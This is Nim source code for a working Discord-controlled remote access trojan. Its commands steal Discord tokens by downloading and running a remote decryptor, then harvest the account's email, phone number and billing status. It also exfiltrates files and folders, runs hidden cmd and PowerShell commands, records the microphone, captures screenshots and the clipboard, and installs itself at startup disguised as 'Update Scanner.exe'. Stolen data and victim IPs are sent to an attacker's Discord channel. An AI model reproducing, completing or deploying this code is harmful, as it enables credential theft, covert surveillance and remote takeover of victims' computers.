import dimscord, asyncdispatch, options, os, strutils, sequtils, sets, streams, osproc, winim/lean, modules/[audio, clipboard, config, screenshot], json, zippy/ziparchives, puppy

var thisTarget = getenv("username") & "@" & getenv("computername")
var selectedTarget: string

let discord = newDiscordClient(token=discordToken)

const helpMessage = """
**__Control__**
`.help` - show help message
`.ping` - ping all clients
`.select <username/all>` - select current target

**__Grabber__**
`.discord` - send all discord tokens
`.discordinfo` - send all discord tokens with info

**__File Management__**
`.upload <attachment>` - upload file(s) to target (AppData\Local\Temp)
`.dfile <path>` - download a file from target 
`.dfolder <path>` - download a folder (.zip) from target

**__System__**
`.cmd <command>` - execute silent cmd command
`.shell <command>` - execute silent powershell command
`.startup` - add payload to startup

**__Surveillance__**
`.screenshot` - take a screenshot and send
`.record <seconds>` - record mic for selected amount of seconds
`.clipboard` - send clipboard content
"""

proc isDir(filepath: string): bool =
    let path_info: FileInfo = getFileInfo(filepath)
    if path_info.kind == pcDir:
        result = true
    else:
        result = false

proc deleteDirRecursively(path: string) = 
    for entry in walkDir(path):
        if isDir(entry.path):
            deleteDirRecursively(entry.path)
        else:
            removeFile(entry.path)
    removeDir(path)

proc onReady(s: Shard, r: Ready) {.event(discord).} =
    var
        ip_response = get("https://ipinfo.io/json")
        ipinfo = ip_response.body
    var ipinfoJson = parseJson(ipinfo)
    discard await discord.api.sendMessage(newUsersChannelId, "||@everyone||\nNew connection: `" & thisTarget & "`\nSelect this target: `.select " & thisTarget & "`\nIP: `" & ipinfoJson["ip"].getStr() & "` (" & ipinfoJson["country"].getStr() & ")")

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
    if (m.author.bot): return

    if (m.content == ".ping"):
        discard await discord.api.sendMessage(m.channel_id, "Hello from **" & thisTarget & "**. " & $s.latency() & "ms")

    if (m.content.startsWith(".select")):
        var targetClient = split(m.content, " ")[1]
        try:
            if (selectedTarget == "all"):
                selectedTarget = thisTarget
                return
            selectedTarget = targetClient
            if (selectedTarget == thisTarget):
                discard await discord.api.sendMessage(m.channel_id, "Selected **" & selectedTarget & "**")
        except:
            discard await discord.api.sendMessage(m.channel_id, "No target selected!")

    if (selectedTarget == thisTarget):
        if (m.content == ".help"):
            discard await discord.api.sendMessage(m.channel_id, helpMessage)

        elif (m.content == ".discord"):
            discard await discord.api.sendMessage(m.channel_id, "Collecting tokens...")
            let decryptorPath = getTempDir() / "tokens.exe"
            try:
                var
                    response = get(tokenDecryptorUrl)
                    f = newFileStream(decryptorPath, fmWrite)
                f.write(response.body)
                f.close()
            except:
                discard await discord.api.sendMessage(m.channel_id, "Error downloading decryptor!\n" & tokenDecryptorUrl)
            try:
                let res = execProcess(decryptorPath, options = {poStdErrToStdOut, poUsePath})
                let tokens = res.strip().split(", ")

                var filteredTokens: seq[string]
                for a in tokens:
                    filteredTokens.add(a.replace("\"", "").replace("[", "").replace("]", ""))

                filteredTokens = toSeq(toSet(filteredTokens))

                for token in filteredTokens:
                    discard await discord.api.sendMessage(m.channel_id, "`" & token & "`")
            except CatchableError as e:
                discard await discord.api.sendMessage(m.channel_id, "Error decrypting tokens!\n" & e.msg)

        elif (m.content == ".discordinfo"):
            discard await discord.api.sendMessage(m.channel_id, "Collecting tokens...")
            let decryptorPath = getTempDir() / "tokens.exe"
            try:
                var
                    response = get(tokenDecryptorUrl)
                    f = newFileStream(decryptorPath, fmWrite)
                f.write(response.body)
                f.close()
            except:
                discard await discord.api.sendMessage(m.channel_id, "Error downloading decryptor!\n" & tokenDecryptorUrl)
            try:
                let res = execProcess(decryptorPath, options = {poStdErrToStdOut, poUsePath})
                let tokens = res.strip().split(", ")

                var filteredTokens: seq[string]
                for a in tokens:
                    filteredTokens.add(a.replace("\"", "").replace("[", "").replace("]", ""))

                filteredTokens = toSeq(toSet(filteredTokens))

                for token in filteredTokens:
                    let headers = @[
                        ("Authorization", token),
                        ("Content-Type", "application/json")
                    ]

                    var response = get("https://discordapp.com/api/v6/users/@me", headers = headers)
                    
                    if response.code == 401:
                        discard await discord.api.sendMessage(m.channel_id, "Token `" & token & "` is invalid!")
                        continue

                    if response.code == 200:
                        let jsonResponse = parseJson(response.body)
                        let email = jsonResponse["email"].getStr()
                        var phone = jsonResponse["phone"].getStr()
                        if phone == "":
                            phone = "No phone number"
                        let userid = jsonResponse["id"].getStr()
                        let username = jsonResponse["username"].getStr() & "#" & jsonResponse["discriminator"].getStr()
                        let avatar = "https://cdn.discordapp.com/avatars/" & jsonResponse["id"].getStr() & "/" & jsonResponse["avatar"].getStr()

                        let nitroResp = get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers = headers)
                        let nitro = $((parseJson(nitroResp.body)).len > 0)

                        let billingResp = get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers = headers)
                        let billing = $((parseJson(billingResp.body)).len > 0)
                        var embed = Embed(
                            title: some "User info",
                            image: some EmbedImage(url: avatar),
                            fields: some @[
                                EmbedField(
                                    name: "Token",
                                    value: "`" & token & "`"
                                ),
                                EmbedField(
                                    name: "Email",
                                    value: email
                                ),
                                EmbedField(
                                    name: "Phone number",
                                    value: phone
                                ),
                                EmbedField(
                                    name: "Username",
                                    value: username & " (" & userid & ")"
                                ),
                                EmbedField(
                                    name: "Nitro",
                                    value: nitro
                                ),
                                EmbedField(
                                    name: "Billing",
                                    value: billing
                                )
                            ]
                        )
                        discard await discord.api.sendMessage(m.channel_id, embeds = @[embed])

            except Exception as e:
                discard await discord.api.sendMessage(m.channel_id, "Error decrypting tokens!\n" & e.msg)

        elif (m.content == ".upload"):
            discard await discord.api.sendMessage(m.channel_id, "Uploading...")
            for attachmentIndex, attachmentValue in m.attachments:
                var
                    fileName = attachmentValue.filename
                    url = attachmentValue.url
                    response = get(url)
                    f = newFileStream(joinPath(getTempDir(), fileName), fmWrite)
                f.write(response.body)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, "Uploaded **" & filename & "** to **" & thisTarget & "**")

        elif (m.content.startsWith(".dfile")):
            discard await discord.api.sendMessage(m.channel_id, "Downloading...")
            try:
                var path = split(m.content, " ")[1]
                discard await discord.api.sendMessage(m.channel_id, "Downloaded from **" & thisTarget & "**", files = @[DiscordFile(name: path)])
            except:
                discard await discord.api.sendMessage(m.channel_id, "File not found!")

        elif (m.content.startsWith(".dfolder")):
            discard await discord.api.sendMessage(m.channel_id, "Downloading...")
            try:
                var path = split(m.content, " ")[1]
                let archivePath = joinPath(getTempDir(), "archive.zip")
                createZipArchive(path, archivePath)
                discard await discord.api.sendMessage(m.channel_id, "Downloaded from **" & thisTarget & "**", files = @[DiscordFile(name: archivePath)])
            except:
                discard await discord.api.sendMessage(m.channel_id, "Folder not found!")

        elif (m.content.startsWith(".record")):
            discard await discord.api.sendMessage(m.channel_id, "Recording...")
            try:
                var time = m.content[8 .. m.content.high]
                record_mic(time.parseInt() + 1)
                discard await discord.api.sendMessage(m.channel_id, "Recorded mic input from **" & thisTarget & "** for **" & time & "** seconds", files = @[DiscordFile(name: "recording.wav")])
                os.removeFile("recording.wav")
            except:
                discard await discord.api.sendMessage(m.channel_id, "Something went wrong!")
        
        elif (m.content == ".screenshot"):
            discard await discord.api.sendMessage(m.channel_id, "Taking a screenshot...")
            try:
                get_screenshot()
                discard await discord.api.sendMessage(m.channel_id, "Screenshot from **" & thisTarget & "**", files = @[DiscordFile(name: "screenshot.png")])
                os.removeFile("screenshot.png")
            except:
                discard await discord.api.sendMessage(m.channel_id, "Something went wrong!")

        elif (m.content == ".startup"):
            discard await discord.api.sendMessage(m.channel_id, "Adding to startup...")
            try:
                copyfile(getAppFilename(), getEnv("APPDATA") & r"\Microsoft\Windows\Start Menu\Programs\Startup\Update Scanner.exe")
                discard await discord.api.sendMessage(m.channel_id, "Added to startup successfully for " & thisTarget)
            except CatchableError as e:
                discard await discord.api.sendMessage(m.channel_id, "Failed to add to startup!\n" & e.msg)

        elif (m.content == ".clipboard"):
            discard await discord.api.sendMessage(m.channel_id, "Getting clipboard...")
            try:
                var 
                  clip = get_clipboard()
                  f = newFileStream("clipboard.txt", fmWrite)
                f.write(clip)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, "Clipboard from **" & thisTarget & "**", files = @[DiscordFile(name: "clipboard.txt")])
                os.removeFile("clipboard.txt")
            except:
                discard await discord.api.sendMessage(m.channel_id, "Something went wrong!")

        elif (m.content.startswith(".cmd")):
            discard await discord.api.sendMessage(m.channel_id, "Running command...")
            var 
                command = m.content[4 .. m.content.high]
                outp = execProcess("cmd.exe /c " & command , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
            
            if outp.len() < 2000:
                try:
                    if outp == "":
                        outp = "No output"
                    discard await discord.api.sendMessage(m.channel_id, "Ran `" & command & "` on **" & thisTarget & "**\nOutput:\n```" & outp & "```")
                except:
                    discard await discord.api.sendMessage(m.channel_id, "Ran `" & command & "` on **" & thisTarget & "** but no output size is too big.")
            else:
                var f = newFileStream("output.txt", fmWrite)
                f.write(outp)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, "Output from **" & thisTarget & "**.", files = @[DiscordFile(name: "output.txt")])
                os.removeFile("output.txt")

        elif (m.content.startswith(".shell")):
            discard await discord.api.sendMessage(m.channel_id, "Running command...")
            var 
                command = m.content[6 .. m.content.high]
                outp = execProcess("powershell.exe /c " & command , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
            
            if outp.len() < 2000:
                try:
                    if outp == "":
                        outp = "No output"
                    discard await discord.api.sendMessage(m.channel_id, "Ran `" & command & "` on **" & thisTarget & "**\nOutput:\n```" & outp & "```")
                except:
                    discard await discord.api.sendMessage(m.channel_id, "Ran `" & command & "` on **" & thisTarget & "** but no output size is too big.")
            else:
                var f = newFileStream("output.txt", fmWrite)
                f.write(outp)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, "Output from **" & thisTarget & "**.", files = @[DiscordFile(name: "output.txt")])
                os.removeFile("output.txt")


waitFor discord.startSession(
    gateway_intents = {giGuildMessages, giMessageContent}
)
